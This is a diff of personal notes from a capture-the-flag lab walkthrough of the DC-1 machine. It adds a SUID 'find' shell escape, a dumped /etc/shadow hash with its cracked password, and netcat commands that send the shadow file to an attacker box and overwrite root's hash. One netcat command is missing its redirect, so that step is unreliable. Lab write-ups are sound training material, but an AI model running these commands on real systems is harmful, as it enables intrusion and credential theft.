@@ -207,9 +207,12 @@ Exploitation technique used to achieve RCE on the target is based on exploit/mul
 - ran linpeas. got this: <br>
 ![[DC1LinpeasOutputInteresting1.png]]
 - lets check gtfobins for easy privesc
+```sh
+find . -exec /bin/sh \; -quit 
+```
 - heh got partial root: <br>
 ![[DC1partialRootSS.png]]
-- lets see if theres any flags in the root directory
+- lets see if theres any flags in the root directory sc
 - oh it says "the final flag". so theres other flags? 
 - lemme find all the flags
 - flag1: `/var/www/flag1.txt`
@@ -223,7 +226,7 @@ Can you use this same method to find or access the flag in root?
 Probably. But perhaps it's not that easy.  Or maybe it is?
 ```
 - bruh did i exploit this machine in the unintended way?
-- finalFlag:`/root/thefinalflag.txt`
+- finalFlag:`/root/thefinalflag.txt` 
 ```
 Well done!!!!
 
@@ -232,6 +235,22 @@ Hopefully you've enjoyed this and learned some new skills.
 You can let me know what you thought of this little journey
 by contacting me via Twitter - @DCAU7
 ```
+- gotta get full root too. got `/etc/shadow`
+- hash for user `flag4`: `$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80` 
+- cracked with [[john the ripper]]. the pass was `orange`
+- cant directly edit it comfortably in the shell. need a term. transferred the entire file with [[netcat]] 
+```sh
+nc IP port < /etc/shadow # on DC1
+nc -nvlp port > shadow # on kali 
+```
+- replaced root's hash with flag4's hash and transfered it back the same way
+```sh
+nc IP port < shadow # on kali 
+nc -nvlp port /etc/shadow # on DC1 
+```
+- logged in via [[SSH]] as root :D <br>
+![[DC1Rooted-1.png]]
+
 ### alt path: https://github.com/pimps/CVE-2018-7600
 - https://cybersecuritywriteups.com/proving-grounds-dc-1-walkthrough-133af4b2c6e9
 - https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640
